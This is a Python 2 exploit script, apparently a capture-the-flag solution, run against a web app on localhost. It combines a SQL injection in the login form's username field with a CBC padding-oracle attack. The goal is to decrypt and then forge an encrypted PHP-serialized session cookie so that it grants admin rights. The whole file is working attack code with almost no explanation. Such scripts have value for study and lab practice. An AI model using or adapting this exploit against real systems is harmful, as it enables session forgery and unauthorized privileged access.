# encoding:utf-8
import requests
import base64
url='http://localhost:10080'
N=16

def inject(password):
    param={'username':"' union select 'bendawangbendawangbendawang','{password}".format(password=password),'password':''}
    result=requests.post(url,data=param)
    return result

def xor(a, b):
    return "".join([chr(ord(a[i])^ord(b[i%len(b)])) for i in xrange(len(a))])

def pad(string,N):
    l=len(string)
    if l!=N:
        return string+chr(N-l)*(N-l)

def padding_oracle(N,cipher,plaintext):
    get=""
    for i in xrange(1,N+1):
        for j in xrange(0,256):
            padding=xor(get,chr(i)*(i-1))
            c='a'*(16-i)+chr(j)+padding+cipher
            result=inject(base64.b64encode(chr(0)*16+c))
            if "Hello" not in result.content:
                get=chr(j^i)+get
                print get.encode('hex')
                break
    return xor(get,plaintext)


jsession=inject("bendawang").headers['set-cookie'].split('=')[1].replace("%3D",'=').replace("%2F",'/').replace("%2B",'+').decode('base64')

serialize=jsession[:-16]
print serialize
p=[]
for i in xrange(0,len(serialize),16):
    p.append(serialize[i:i+16])
l=len(p)
p[l-1]=pad(p[l-1],N)
c=[""]*l
c[l-1]=jsession[-16:]

for i in xrange(l-1,0,-1):
    c[i-1]=padding_oracle(N,c[i],p[i])

#c=['\x88\xbb|I1e\x1c\xb9u\xe4\x8e\x90\x08\xc1\xa9\x11', 'sd\x0c2\x13i\xac\xfd\x16\x9e\xa8\xc5?\x07/\xe5', '>\xbfZX\xda\x10\x99^\xd9\xa3\x15\xa9\\Q-\x9e', '\xf5;\xc6\x1cn\x0f\xe5\x1bJ{\x08\x00\xbd\x8d\x17\x18', '\xd0PP\xbfK\x8b:\x12\xaa\xa8Et\x83\x12T\xe7']

p[4]=pad(';b:1;}',N)
p[2]=xor(xor(c[3],p[4]),c[1])
param={'username':"' union select 'bendawangb{new_p}g','bendawang".format(new_p=p[2]),'password':''}
result=requests.post(url,data=param)
#print p
jsession=result.headers['set-cookie'].split('=')[1].replace("%3D",'=').replace("%2F",'/').replace("%2B",'+').decode('base64')
print c
c=[""]*l
serialize=jsession[:-16]
p=[]
for i in xrange(0,len(serialize),16):
    p.append(serialize[i:i+16])
#print p
p[l-1]=pad(p[l-1],N)
c[l-1]=jsession[-16:]
for i in xrange(l-1,1,-1):
    c[i-1]=padding_oracle(N,c[i],p[i])
print c

new_jsession=base64.b64encode('a:2:{s:4:"name";s:27:"bendawangbendawangbendawang";s:7:"isadmin";b:1;}'+c[2])
header = {"Cookie":"JSESSION="+new_jsession}
r = requests.post(url, headers=header)
print r.content